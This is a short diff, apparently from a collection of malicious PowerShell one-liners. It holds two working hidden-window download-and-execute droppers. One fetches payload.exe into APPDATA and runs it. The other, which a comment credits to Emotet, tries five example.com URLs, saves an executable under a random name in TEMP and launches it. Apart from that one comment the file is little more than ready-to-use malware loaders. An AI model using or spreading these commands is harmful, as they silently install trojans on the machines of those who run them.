@@ -1,2 +1,5 @@
 powershell.exe -WindowStyle Hidden -noprofile If (test-path $env:APPDATA + '\payload.exe') {Remove-Item $env:APPDATA + '\payload.exe'}; $OEKQD = New-Object System.Net.WebClient; $OEKQD.Headers['User-Agent'] = 'USR-KL'; $OEKQD.DownloadFile('http://example.com/payload.exe', $env:APPDATA + '\payload.exe'); (New-Object -com Shell.Application).ShellExecute($env:APPDATA + '\payload.exe'); Stop-Process -Id $Pid -Force
 
+powershell -WindowStyle Hidden $wscript = new-object -ComObject WScript.Shell;$webclient = new-object System.Net.WebClient;$random = new-object random;$urls = 'http://example.com/rwibpm/,http://example.com/awhwgra/,http://example.com/ev/,http://example.com/ckgawd/,http://example.com/kukajweln/'.Split(',');$name = $random.next(1, 65536);$path = $env:temp + '\' + $name + '.exe';foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);Start-Process $path;break;}catch{write-host $_.Exception.Message;}}   //This is from the popular emotet. It downloads the trojan from 5 different URLs, saves it in the temp directory using a randomly generated numerical name, and then executes it.
+
+
